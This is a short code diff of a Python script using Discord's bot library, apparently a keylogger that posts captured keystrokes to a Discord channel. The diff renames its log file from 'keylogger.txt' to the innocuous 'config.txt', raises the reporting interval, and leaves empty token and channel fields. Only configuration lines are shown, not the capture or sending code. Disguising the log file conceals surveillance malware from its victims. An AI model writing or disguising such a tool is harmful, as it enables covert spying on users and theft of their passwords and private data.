@@ -5,10 +5,10 @@ from discord.ext import commands
 import asyncio
 
 logging.disable(logging.CRITICAL)
-carpeta_destino = 'C:\\keylogger.txt'
+carpeta_destino = 'C:\\config.txt'
 TOKEN = ''
 CANAL_ID = 
-INTERVALO = 10
+INTERVALO = 15
 
 logging.disable(logging.CRITICAL)
 
